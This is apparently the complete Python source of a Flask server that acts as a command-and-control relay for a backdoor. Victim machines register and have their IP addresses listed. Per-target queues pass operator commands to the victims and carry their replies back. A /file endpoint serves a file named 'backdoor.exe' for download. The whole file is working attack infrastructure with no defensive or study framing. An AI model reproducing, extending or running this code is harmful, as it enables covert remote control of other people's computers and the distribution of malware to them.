from flask import Flask, Response, jsonify, send_file, request
from werkzeug.middleware.proxy_fix import ProxyFix
import os

app = Flask(__name__)
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)

server_queues: dict[str, list] = {}
client_queues: dict[str, list] = {}
registered_targets = {}

@app.route('/register', methods=['POST'])
def register():
    data = request.get_json()
    target_id = data['id']
    ip = request.remote_addr
    registered_targets[target_id] = {'ip': ip}
    server_queues[target_id] = []
    client_queues[target_id] = []
    return 'registered'

@app.route('/targets', methods=['GET'])
def list_targets():
    return jsonify({
        tid: data['ip']
        for tid, data in registered_targets.items()
    })

@app.route('/server/send/<target_id>', methods=['POST'])
def serversend(target_id):
    data = request.get_json()
    if target_id in client_queues:
        client_queues[target_id].append(data)
        if server_queues[target_id]:
            server_queues[target_id].pop()
    return ''

@app.route('/server/recv/<target_id>', methods=['POST'])
def serverrecv(target_id):
    if target_id not in server_queues or not server_queues[target_id]:
        return Response(status=204)
    return jsonify(server_queues[target_id][-1])

@app.route('/client/send/<target_id>', methods=['POST'])
def clientsend(target_id):
    data = request.get_json()
    if target_id not in server_queues:
        return ''
    server_queues[target_id].append(data)
    return ''

@app.route('/client/recv/<target_id>', methods=['POST'])
def clientrecv(target_id):
    if target_id not in client_queues or not client_queues[target_id]:
        return Response(status=204)
    return jsonify(client_queues[target_id].pop())

@app.route('/bye/<target_id>', methods=['POST'])
def bye(target_id):
    registered_targets.pop(target_id, None)
    server_queues.pop(target_id, None)
    client_queues.pop(target_id, None)
    return ''

@app.route('/file')
def file():
    try:
        file_path = os.path.join('dist', "backdoor.exe")

        if os.path.isfile(file_path):
            return send_file(file_path, as_attachment=True, download_name="backdoor.exe")
        else:
            return "File not found.", 404
    except Exception as e:
        return str(e), 500
